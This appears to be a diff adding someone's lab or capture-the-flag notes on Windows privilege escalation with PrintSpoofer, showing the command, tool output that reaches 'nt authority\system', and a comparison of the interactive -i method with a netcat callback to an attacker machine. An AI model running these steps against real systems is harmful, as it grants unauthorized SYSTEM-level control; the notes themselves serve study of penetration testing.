@@ -1,0 +1,32 @@
+c:\tmp>.\PrintSpoofer64.exe -i -c cmd                     _ IT DOESN'T REQUIRE ANY BATCH FILE OR NC LISTNER as here -i (interactive) method directly worked.
+
+
+c:\tmp>.\PrintSpoofer64.exe -i -c cmd
+.\PrintSpoofer64.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+
+NOTE:----------------------------------------------------------------------------------
+1. Interactive vs. Non-Interactive
+
+    The Batch/Netcat Method (Non-Interactive): This is usually required when you are executing commands through a web shell (like an ASPX or PHP shell) or a "blind" SQL injection. In those environments, you can't "talk" to a new process,
+so you have to tell PrintSpoofer to run a batch file that "calls home" to your Kali machine using Netcat.
+    The -i Method (Interactive): Because you already had a functional Command Prompt or PowerShell session open on the target, PrintSpoofer was able to use the -i (Interactive) flag. This flag tells the tool to "hijack" your current terminal 
+window and redirect the input/output of the new SYSTEM process into your current screen.
+
+2. When to use each approach
+Method
+	Use Case	Requirement
+Direct -i -c cmd	When you have a working terminal/RDP/SSH session.	A stable interactive console.
+Batch File / Netcat	When you have a "Web Shell" (IIS/Tomcat) or a restricted remote execution.	A listener (nc -lvnp) on your attacker machine.
+PrintSpoofer is a tool used for local privilege escalation on Windows systems. The -i flag allows for interactive use when a stable command-line session is available. This differs from methods involving batch files and netcat, which are typically used 
+in scenarios where an interactive shell is not readily available, such as through a web shell or other forms of limited remote execution. Understanding the different methods helps in determining the appropriate approach based on the specific access 
+and environment on the target system. The PrintSpoofer GitHub documentation provides further details on its usage.
